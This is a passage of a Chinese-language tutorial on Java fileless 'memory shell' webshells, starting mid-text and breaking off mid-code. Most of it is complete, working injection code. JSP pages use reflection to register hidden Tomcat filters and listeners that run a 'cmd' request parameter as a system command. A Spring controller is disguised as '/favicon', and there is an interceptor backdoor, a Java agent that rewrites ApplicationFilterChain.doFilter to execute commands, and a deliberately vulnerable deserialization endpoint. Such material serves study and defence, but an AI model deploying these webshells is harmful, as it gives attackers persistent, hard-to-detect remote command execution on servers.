
然后按照我们之前的`servlet`部分一样配置即可，之后我们访问`/demo`即可触发！！

![截图](4fcbda6582452c8d16ae6cb86839a7b3.png)

进行断点测试：

![截图](e0bd226a277c4dc3faf75c59daf29ade.png)

![截图](a4fdb417b75612b1cfaa08f7c7efe1a6.png)

然后我们进一步的根据宽字节安全的流程图来理解上面我们进行的断点分析过程中的流程：

![截图](fff06c06764da31e2ddf918e9a79fece.png)

- 首先获取当前`context`，并从`context`中获取`FilterMap`，并利用`matchFiltersURL`去确定请求的`url`和`Filter`中需要拦截的正则表达式是否匹配； ==> `FilterMap`存放了`Filter`的名称和需要拦截的url的正则表达式。

- 如果匹配了，则利用`context.findFilterConfig`方法在 `FilterConfigs `中查找对应的` FilterConfig`；
- 然后，将查找到的`FilterConfig`添加到`FilterChain`中，并且返回 `FilterChain`；
- 最后，`FilterChain`会调用`internalDoFilter`方法去遍历`chain`中每一项`FilterConfig`，然后获取从`FilterConfig` 中获取 `Filter`，然后调用 `Filter` 的` doFilter` 方法进行后续的操作！

因此，根据上诉过程我们不难推断出要想动态的添加一个`filter`，那么我们依旧需要利用`contex`进行操作（要么通过反射修改`contex`相关字段，要么用`contex`自带的方法）

#### （2）内存马

过程，也与`Servlet`类似：

1、获取`tomcat`中`ServletContext`的实现类，即`ApplicationContext`，并进一步获取对应的`StandardContext`实例；

2、创建恶意的`filter`；

3、用`filterDef`对`filter`进行封装，并添加到`filterDefs`中；

4、最后创建新的`filterMap`绑定`filter`和`url`，然后添加到对应的`filterMaps`，并将我们恶意的`filter`置于`filterChain`的第一位

5、将对应信息放入`filiterconfig`中。

> FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息
>
> FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息
>
> FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern。对应了web.xml中配置的<filter-mapping>，里面代表了各个filter之间的调用顺序
>
> FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
> {: .prompt-tip}

由于我们动态的生成了一个新的过滤链，且存在于`StandardContext`之中，因此我们创建的内存马会一直驻留，直至web服务的重启！

**第一步：**获取我们所需的`StandardContext`的信息：

```jsp
<%
    // 获取StandardContext
    ServletContext ctx = request.getSession().getServletContext(); // 获取ServletContext对象，它代表当前Web应用的上下文环境
    Field f = ctx.getClass().getDeclaredField("context"); // 通过反射获取ServletContext实例的"context"字段。
    f.setAccessible(true); // 设置访问权限，允许访问私有字段
    ApplicationContext appCtx = (ApplicationContext)f.get(ctx); // 获取实际的ApplicationContext对象

    f = appCtx.getClass().getDeclaredField("context"); //使用反射，从ApplicationContext对象中获取"context"字段，
    f.setAccessible(true); // 设置访问权限
    StandardContext standardCtx = (StandardContext)f.get(appCtx); // 获取StandardContext对象
%>
```

获取对应的`filterConfigs`

```jsp
<%
    Field Configs = standardCtx.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardCtx);
%>
```

**第二步：**创建恶意的监听器：

```jsp
<%
    final String name = "yuan";
    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() { // filter类模板
            @Override
            public void init(FilterConfig filterConfig) throws ServletException { //初始化

            }

            // filter的主要操作，包含过滤调用等
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                // 恶意代码步骤
                String cmd = servletRequest.getParameter("cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = servletResponse.getWriter();
                out.println(output);
                out.flush();
                out.close();
                // 调用filterChain的doFilter
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };
%>
```

**第三步：**用`filterDef`对`filter`进行封装，并添加到`filterDefs`跟`filterConfigs`中；

```jsp
<%
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);
%>
```

**第四步：**建新的`filterMap`绑定`filter`和`url

```jsp
<%
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap); // 设置顺序
%>
```

**第五步：**将对应信息放入`filiterconfig`中

```jsp
<%
        // 添加到configs中
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardCtx,filterDef);

        filterConfigs.put(name,filterConfig);
%>
```

最后完整代码如下：

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="javax.servlet.DispatcherType"%>
<%@ page import="javax.servlet.Filter"%>
<%@ page import="javax.servlet.FilterChain"%>
<%@ page import="javax.servlet.FilterConfig"%>
<%@ page import="javax.servlet.FilterRegistration"%>
<%@ page import="javax.servlet.ServletContext"%>
<%@ page import="javax.servlet.ServletException"%>
<%@ page import="javax.servlet.ServletRequest"%>
<%@ page import="javax.servlet.ServletResponse"%>
<%@ page import="javax.servlet.annotation.WebServlet"%>
<%@ page import="javax.servlet.http.HttpServlet"%>
<%@ page import="javax.servlet.http.HttpServletRequest"%>
<%@ page import="javax.servlet.http.HttpServletResponse"%>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page import="org.apache.tomcat.util.descriptor.web.*"%>
<%@ page import="org.apache.catalina.Context"%>
<%@ page import="java.lang.reflect.*"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.util.Map"%>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
</head>
<body>
<%
final String name = "yuan";

ServletContext ctx = request.getSession().getServletContext();
Field f = ctx.getClass().getDeclaredField("context");
f.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext)f.get(ctx);

f = appCtx.getClass().getDeclaredField("context");
f.setAccessible(true);
StandardContext standardCtx = (StandardContext)f.get(appCtx);


f = standardCtx.getClass().getDeclaredField("filterConfigs");
f.setAccessible(true);
Map filterConfigs = (Map)f.get(standardCtx);

if (filterConfigs.get(name) == null) {
   out.println("inject "+ name);
   
   Filter filter = new Filter() {
      @Override
      public void init(FilterConfig arg0) throws ServletException {
         // TODO Auto-generated method stub
      }

      // filter的主要操作，包含过滤调用等
      @Override
      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         // 恶意代码步骤
         String cmd = servletRequest.getParameter("cmd");
         boolean isLinux = true;
         String osTyp = System.getProperty("os.name");
         if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
         }
         String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
         Scanner s = new Scanner(in).useDelimiter("\\a");
         String output = s.hasNext() ? s.next() : "";
         PrintWriter out = servletResponse.getWriter();
         out.println(output);
         out.flush();
         out.close();
         // 调用filterChain的doFilter
         filterChain.doFilter(servletRequest,servletResponse);
      }
      
      @Override
      public void destroy() {
         // TODO Auto-generated method stub
      }
   };
   
   FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    
    standardCtx.addFilterDef(filterDef);
   
   FilterMap m = new FilterMap();
   m.setFilterName(filterDef.getFilterName());
   m.setDispatcher(DispatcherType.REQUEST.name());
   m.addURLPattern("/*");
   
   
   standardCtx.addFilterMapBefore(m);
   
   
   Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
   constructor.setAccessible(true);
   FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);
   
   
    filterConfigs.put(name, filterConfig);
    
    out.println("injected");
}
%>
</body>
</html>
```

查看一下效果：

![截图](cbe7764e5781c4e87bae44de8495ea94.png)

![截图](d5db974b4566d3d0a9ead17a3fdc809c.png)

### 3、Listener型

前文我们曾提过，`Listener`的监听主要分为三类：

- `ServletContext`监听：用于对Servlet整个上下文进行监听（创建、销毁）； --> 可以利用ServletContextListener监听器在创建ServletContext域对象时完成一些想要初始化的工作或者执行自定义任务调度。
  > 创建：启动服务器时创建
  > 销毁：关闭服务器或者从服务器移除项目

- `Session`监听：对Session的整体状态的监听； --> 每位用户登录网站时都会创建一个HTTPSession对象，利用这个可以统计在线人数。
  > 生命周期： 
  > 创建：只要调用了getSession()方法就会创建,一次会话只会创建一次,
  > 销毁：1.超时(默认为30分钟) ；2.非正常关闭,销毁 ； 3.正常关闭服务器(序列化)
- `Reques`监听：用于对Request请求进行监听（创建、销毁）；
  > 创建——访问服务器任何资源都会发送请求(ServletRequest)出现,访问.html和.jsp和.servlet都会创建请求。
  > 销毁——服务器已经对该次请求做出了响应。

根据上述的生命周期，我们可以很容易的看出来只有`Reques`比较适合我们的内存马。这是因为`ServletContext`的创建与服务器启动有关，而`session`的监听则涉及到会话的建立与销毁（比较困难且很容易就被销毁了）。

#### （1）Listener Demo

这里我们写一个简单的监听器的demo：

```java
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.util.EventListener;

public class DemoListener implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent){
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent){
        System.out.println("yuan!!!");
    }
}
```

可以看到已经成功启动！！

![截图](f98abb745b80ce58e29c763ef7976991.png)

我们设置断点，并查看源码部分：

![截图](a09b2b7646e718fab1b3ad30f3ff1525.png)

首先，我们在堆栈的过程中找到了我们熟悉无比的`StandardContext`方法，进一步地，我们进行分析代码 --> 首先，可以看到在这里我们通过`getApplicationEventListeners()`获取到了我们的`listener`的一个实例。然后接下来进行判断是否为空，然后进一步的获取当前的`ServletRequestEvent`值。然后接下来遍历判断，如果存在我们获取当前的类型，并最终转化成`ServletRequestListener`，而后执行`listener.requestInitialized(event)`。 就如我们demo中的一样，当执行此处时候，就会触发我们写入的恶意代码。

![截图](f0f42cca4de8f366535b297201bba9a0.png)

我们查看`getApplicationEventListeners()`的内容，从中可以看出这里是通过`applicationEventListenersList`进行获取的。因此，我们只需要将我们的恶意的Listener注入到这个`List`当中即可。

#### （2）内存马

过程：

- 创建恶意Listener；
- 将其添加到ApplicationEventListener中去

同理，首先获取对应的`StandardContext`：

```jsp
<%
    Object obj = request.getServletContext();
    java.lang.reflect.Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
    //获取ApplicationContext
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
%>
```

创建恶意的`Listener`：

```jsp
<%!
    public class ListenerDemo implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            System.out.println("requestDestroyed");
        }
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("requestInitialized");
            try{
                String cmd = sre.getServletRequest().getParameter("cmd");
                Runtime.getRuntime().exec(cmd);
            }catch (Exception e ){
                //e.printStackTrace();
            }
        }
    }
%>
```

将其添加到`ApplicationEventListener`中：

```jsp
<%
    ListenerDemo listenerdemo = new ListenerDemo();
    //创建能够执行命令的Listener
    standardContext.addApplicationEventListener(listenerdemo);
%>
```

全部源代码：

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%
    Object obj = request.getServletContext();
    java.lang.reflect.Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
    //获取ApplicationContext
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
    //获取StandardContext
    ListenerDemo listenerdemo = new ListenerDemo();
    //创建能够执行命令的Listener
    standardContext.addApplicationEventListener(listenerdemo);
%>
<%!
    public class ListenerDemo implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            System.out.println("requestDestroyed");
        }
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("requestInitialized");
            try{
                String cmd = sre.getServletRequest().getParameter("cmd");
                Runtime.getRuntime().exec(cmd);
            }catch (Exception e ){
                //e.printStackTrace();
            }
        }
    }
%>
```

演示效果：

![截图](e086fe9f7d52ec4872ebff75db7018e7.png)

### 4、Spring controller型

具体关于Spring的内容参见第一部分的基础知识详解。 这里，简要的介绍一下什么是`controller`：

> 在 Spring MVC 中，@Controller 注解用于标识一个 Java 类是一个控制器。控制器负责接收请求、处理请求，并返回响应。具体来说，使用 @Controller 注解的类将会被 Spring MVC 自动扫描，并注册为一个控制器。
>
> {: .prompt-tip}

通用的注入技术点有以下几个部分：

- 在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境； 获取`ApplicationContext`

如果要访问和操作 bean（也就是动态注册`controller`的话 ），一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。

- 在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；
- controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；

#### （1）demo

这里，我们可以看看一个普通的`controller`：（代码主要参考了[基于内存 Webshell 的无文件攻击技术研究](https://www.anquanke.com/post/id/198886)）

```java
@Controller
public class HelloController {
    @RequestMapping(value = "/hello", method = RequestMethod.GET)
    public String hello(@RequestParam(value="name", required=false, defaultValue="World") String name, Model model) {
        model.addAttribute("name", name);
        return "hello";
    }
}
```

通过`@RequestMapping`注解标明`url`和请求方法，编译部署后，`spring`会根据这个注解注册好相应的`controller`。因此，最终我们构造的webshell也是需要利用`@RequestMapping`来进行注册的。

当用浏览器访问` /hello `路径时，会在定义好的` View` 中输出 `hello World `字样

#### （2）内存马

这里主要参考了文章：[基于内存 Webshell 的无文件攻击技术研究](https://www.anquanke.com/post/id/198886)

**第一步：**获取`ApplicationContext`的内容

主要有以下几种方法：

```java
// getCurrentWebApplicationContext
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
// WebApplicationContextUtils
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
//RequestContextUtils
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
// getAttribute
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

**第二步：**构造webshell的controller

```java
用来执行命令回显的 Webshell 代码示例：

package me.landgrey;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

@Controller
public class SSOLogin {

    @RequestMapping(value = "/favicon")
    public void login(HttpServletRequest request, HttpServletResponse response){
        try {
            String arg0 = request.getParameter("code");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                response.sendError(404);
            }
        }catch (Exception e){
        }
    }
}

```

**第三步：**注册 controller

```java
/*1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
  mappingHandlerMapping对象是用于注册controller的*/
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
/*2. 通过反射获得自定义 controller 中唯一的 Method 对象
  这里的反射是为了获得Method对象，以便动态注册controller时，
  告知接收到给定url路径的请求后，用那个Method来处理，其中me.landgrey.SSOLogin类就是我们的恶意类*/
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
/* 3. 定义访问 controller 的 URL 地址
   这里定义的url对象是为了指定注入url，这个url就是我们的内存马路径*/
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
/* 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
   告知注入的url允许的请求方法*/
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
/* 5. 在内存中动态注册 controller
   RequestMappingInfo填入的信息类似于@RequestMapping注解中的信息，
   即url、允许的请求方法等。是真正注册controller的步骤*/
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("me.landgrey.SSOLogin").newInstance(), method);

```

> 注意spring的版本，详情可以参考前面的两篇参考文章
>
> {： .prompt-warning}

### 5、Spring interceptor型

除了上文提及的`cotroller`内存马外，在`spring mvc`中的拦截器也可以实现内存马的注入。有关于`interceptor`在源码中是如何进行调用与添加的，可以参考这一篇博客内容：[针对Spring MVC的Interceptor内存马](https://www.cnblogs.com/bitterz/p/14859766.html)

总的来说，关键点在于：向`org.springframework.web.servlet.handler.AbstractHandlerMapping`类的实例对象的`adaptedInterceptors`数组中添加恶意`interceptor`实例对象即可！

#### 内存马

```java
//package bitterz.interceptors;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException {
        //获取上下文
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 获取 adaptedInterceptors 属性值
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        
        // 避免重复添加
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                System.out.println("已经添加过TestInterceptor实例了");
                return;
            }
        }
        
        //创建并添加
        TestInterceptor aaa = new TestInterceptor("aaa");  // 避免进入实例创建的死循环
        adaptedInterceptors.add(aaa);  //  添加全局interceptor
    }

    private TestInterceptor(String aaa){}

    // 恶意代码区域
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String code = request.getParameter("code");
        if (code != null) {
            java.lang.Runtime.getRuntime().exec(code);
            return true;
        }
        else {
//            response.sendError(404);
            return true;
        }}}

```

### 6、java agent

在`JDK1.5`之后引入了一个` java.lang.instrument `包，该包用于提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题。而其中，通过 `java.lang.instrument`实现的工具我们称之为 `Java Agent` ，`Java Agent `能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法。

`Instrumentation` 是 `JVMTIAgent（JVM Tool Interface Agent）`的一部分，`Java agent`通过这个类和目标` JVM `进行交互，从而达到修改数据的效果。`Java agent`主要支持两种方式进行加载：

- 实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）

- 实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）

由于，我们在进行注入的过程中，通常都是`JVM`运行后的环境中进行注入的。因此，这里我们将详细介绍`agentmain`这种方法以及`Instrumentation`。

#### 1、agentmain

在`JDK1.6`以后实现了`attach-on-demand`（按需附着），我们可以使用 `Attach API `动态加载` agent `。`Attach API `存在于`com.sun.tools.attach`中，并且里面有两个重要的类，即：`VirtualMachine` 和 `VirtualMachineDescriptor`。

**1）VirtualMachine**

`VirtualMachine`类的主要作用在于获取系统信息，例如：内存dump、类信息统计（例如JVM加载的类）等。在该类中主要配备有三个方法`LoadAgent`，`Attach `和` Detach` 。

**Attach：**该方法允许我们传入一个`jvm`的`pid`(进程id)，并远程连接到`jvm`上。使用方法如下：

```java
VirtualMachine vm = VirtualMachine.attach(v.id());
```

**LoadAgent：**该方法可以向`jvm`注册一个代理程序`agent`，而该`agent`会得到一个`Instrumentation`的实例，该实例可以在`class`加载前改变`class`的字节码，也可以在`class`加载后重新加载。在调用`Instrumentation`实例的方法时，这些方法会使用`ClassFileTransformer接`口中提供的方法进行处理。

**Detach：**该方法可以从 `JVM `上面解除一个代理。

**2）VirtualMachineDescriptor**

`VirtualMachineDescriptor`是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。

#### 2、Instrumentation

在`Instrumentation`中主要增加了一种名为`Transformer `的` Class `文件转换器，该转化器可以修改二进制流的数据，并且能够对未加载以及已加载的类进行拦截，因此我们可以利用这个特性从而实时的修改字节码状态。`Instrumentation`主要包含了以下三个方法：

**addTransformer：**该方法主要用于注册`Transformer`，因此我们可以通过编写 `ClassFileTransformer `接口的实现类来注册我们自己的转换器（此时，就可以使得类加载时使用我们自己的transfomer进行拦截）。使用如下：

```java
// 注册提供的转换器
void addTransformer(ClassFileTransformer transformer)
```

**getAllLoadedClasses：**该方法的主要作用是列出当前环境中所有已加载的`Class`，故我们可以利用此来查找我们需要自定义的`class`。

**retransformClasses：**该方法的主要作用是对已加载的类`class`进行重定义，即：如果我们的目标类已经被加载了，我们也可以通过该方法，来触发`Transformer`的拦截，以此达到对已加载的类进行字节码修改的效果。

#### 3、内存马

通过以上的基础回顾，我们可以看出要想实现`Agent`内存马的注入，我们就需要想办法动态的修改某些类的字节码。因此，我们必须首先找到一个对应类中的某个方法，而该方法需要满足我们以下两个条件：

1、该方法无论用户请求何种资源都可以被执行（不需要太特殊的利用或者激活条件）；

2、该方法不能影响到web的正常业务。

根据我们前面的内容以及下图我们可以知道，正常的业务请求流程一般依次经过Listener、Filter、Servlet三个组件。而由于我们所需的类需要尽可能的处于http请求调用栈的上方，且不能与具体的URL进行耦合，而且需要对Request以及Response进行响应的。因此，我们最终选择选择利用ApplicationFilterChain#doFilte#doFilte来进行注入。

（主要是因为用户的请求在抵达Servlet之前必定会经过Filter链上的filter的。除此之外，由于其封装了Request以及Response，因此我们不仅能够直接获取用户的请求，还可以将执行结果写入Response中，一举两得~）

![1651476990_626f89fe18277dc1031f8.jpg](2f401a65bb02db2cfe946a52d5d0e135.jpg)

（图来源于：https://www.freebuf.com/articles/web/331954.html）

** 靶场环境搭建**

首先，搭建java1.8对应的spring boot环境。 --> 使用idea，点击新建项目：

（更换：

![截图](6a3fc4189a69fa0afe0bf01379fba63c.png)

选择版本：

![截图](697c041778889ada4fa2135406834987.png)

然后在主应用类或其子包中写入 cc 3.2.1 的利用环境:

```java
package org.example.demospring;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ObjectInputStream;

@Controller
public class CommonsCollectionsVuln {

    @ResponseBody
    @RequestMapping("/cc11")
    public String cc11Vuln(HttpServletRequest request, HttpServletResponse response) throws Exception {
        java.io.InputStream inputStream =  request.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        objectInputStream.readObject();
        return "Hello,World";
    }

    @ResponseBody
    @RequestMapping("/demo")
    public String demo(HttpServletRequest request, HttpServletResponse response) throws Exception{
        return "This is OK Demo!";
    }
}
```

目录清单如下：

![截图](b910db5574e82dc5e7c0c30543af2e62.png)

然后在`pom.xml`中写入cc的依赖：

```
      <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```

![截图](be447bbc0aea4e1e43831ba5ce94fb54.png)

然后运行看看效果：

![截图](8a75085106513ef62f603ca45993b38e.png)

**注入过程：**

第一步，我们写入AgentMain.java：

首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义

```java
//AgentMain.java
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        Class[] allLoadedClasses = ins.getAllLoadedClasses();

        for (Class clazz : allLoadedClasses) {
            if (clazz.getName().equals(ClassName)){
                try {
                    ins.retransformClasses(new Class[]{clazz});
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
```

第二步，修改DefineTransformer.java：

```java
//Transformer.java
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer  {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace("/",".");
        //如果被拦截的类是ApplicationFilterChain，那么对其进行字节码动态修改
        if (className.equals(ClassName)){
            // 创建一个ClassPool对象，获取默认的类搜索路径
            ClassPool classPool = ClassPool.getDefault();
            try {
                // 从ClassPool对象中获取ApplicationFilterChain类的CtClass对象
                CtClass clz = classPool.get(className);

                // 从CtClass对象中获取doFilter方法的CtMethod对象
                CtMethod doFilterMethod = clz.getDeclaredMethod("doFilter");
                //在doFilter方法执行前插入一段代码
                //这段代码从HTTP请求中获取名为“cmd”的参数，并将其作为命令在服务器上执行。然后，它将命令的输出发送回HTTP响应。
                doFilterMethod.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = clz.toBytecode();
                // 将 clz 从 classpool 中删除以释放内存
                clz.detach();
                //返回修改后的ApplicationFilterChain类的字节码
                return bytes;
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```

然后，利用 maven 进行打包`mvn assembly:assembly`打包成 agent.jar就可以。这里当然我们也可以直接利用[AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar包](https://github.com/KpLi0rn/AgentMemShell)

第三步，编写注入agent的程序代码TestAgentMain1：

大致思路为获取到 jvm 的 pid 号之后，调用 loadAgent 方法将 agent.jar 注入进去

```java
public class TestAgentMain1 {

    public static void main(String[] args) {
        try{
            java.lang.String path = "C:\\Users\\Yuan\\Desktop\\AgentMemShell-main\\target\\AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
